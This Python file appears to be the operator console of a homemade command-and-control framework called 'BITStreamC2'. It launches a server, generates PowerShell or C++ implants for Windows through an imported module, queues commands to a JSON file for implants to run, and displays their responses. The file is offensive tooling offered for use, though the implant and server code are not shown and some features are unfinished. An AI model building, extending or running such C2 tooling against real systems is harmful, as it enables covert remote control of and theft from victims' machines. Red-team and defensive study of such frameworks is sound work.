import os
import json
import subprocess
import time
import generate_implant

# Directories and files
BASE_DIR = os.getcwd()
COMMAND_FILE = os.path.join(BASE_DIR, "commands/command.json")
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
RESULT_FILE = os.path.join(UPLOAD_DIR, "response.txt")

# Ensure directories exist
os.makedirs(os.path.dirname(COMMAND_FILE), exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

# Path to the server script (replace with the actual server script name)
SERVER_SCRIPT = "server.py"

# Start the server script
def start_server():
    if not os.path.exists(SERVER_SCRIPT):
        print(f"[-] Server script '{SERVER_SCRIPT}' not found.")
        return None

    print(f"[*] Starting server script: {SERVER_SCRIPT}...")
    server_process = subprocess.Popen(["python2", SERVER_SCRIPT], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(2)  # Give the server time to start
    return server_process

def show_implants():
    print("To be built!")

# Stop the server script
def stop_server(server_process):
    if server_process:
        print("[*] Stopping server script...")
        server_process.terminate()
        server_process.wait()
        print("[+] Server stopped.")

def help_menu():
    print("Help Menu")
    print("[*] show implants -> Show active implants")
    print("[*] generate implant (ps1 or cpp) -> Generate an implant using either Powershell or C++ (C++ source code will need to be compiled on external Windows system")
    print("[*] show command -> Show current command to be taksed to implant")
    print("[*] set command -> Set a command to be tasked to implant")
    print("[*] show response -> View implant response")
    print("[*] help -> Show this help menu")
    print("[*] exit")

# CLI interface
def c2_cli():
    os.system('clear')
    print("\n=== BITSreamC2 ===")
    help_menu()

    while True:
        choice = input("\nBSC2> ")
        if choice == "clear" or choice == "cls":
            os.system('clear')
            
        elif choice == "show implants" or choice == "sh imp":
            show_implants()
            
        elif choice == "generate implant ps1" or choice == "gen imp ps1":
            lang = "ps1"
            gen_implant(lang)
            
        elif choice == "generate implant cpp" or choice == "gen imp cpp":
            lang = "cpp"
            gen_implant(lang)
            
        elif choice == "show command" or choice == "sh cmd":
            with open(COMMAND_FILE, "r") as f:
                command_data = json.load(f)
                command = command_data.get("command", "No command found")
            print(f"[+] Current command for your implant is: {command}\n")
            
        elif choice == "set command" or choice == "set cmd":
            set_command()
            
        elif choice == "show response" or choice == "sh resp":
            view_response()
            
        elif choice == "exit":
            print("Exiting...")
            break

        elif choice == "help":
            help_menu()

        else:
            print("Invalid choice.\n")
            help_menu()

def show_command():
    with open(COMMAND_FILE, "r") as f:
        command_data = json.load(f)
        command = command_data.get("command", "No command found")
        print(f"[+] Current command for your implant is {command}\n")
        
# Set a new command
def set_command():
    command = input("Enter the command to send to the implant: ").strip()
    if command:
        command_data = {"command": command}
        with open(COMMAND_FILE, "w") as f:
            json.dump(command_data, f)
        print(f"[+] Command saved to {COMMAND_FILE}.")
    else:
        print("[-] Command cannot be empty.")

# View the latest response from the implant
def view_response():
    if os.path.exists(RESULT_FILE):
        with open(RESULT_FILE, "r") as f:
            response = f.read()
        print(f"\n[ Implant Response ]:\n{response}")
    else:
        print("[-] No response file found.")

def gen_implant(lang):
    generate_implant.gen(lang)

# Main function
if __name__ == "__main__":
    print("=== BITStreamC2 ===")
    print("[1] Start HTTP Server and Launch Operator Interface")
    print("[2] Start SMB Server and Launch Operator Interface *TODO*")
    print("[2] Exit")

    option = input("\nSelect an option: ")
    if option == "1":
        # Start the server script
        server_process = start_server()
        if server_process:
            try:
                # Launch the CLI interface
                c2_cli()
            finally:
                # Stop the server script when exiting
                stop_server(server_process)
    elif option == "2":
        print("Exiting...")
    else:
        print("Invalid option. Exiting...")
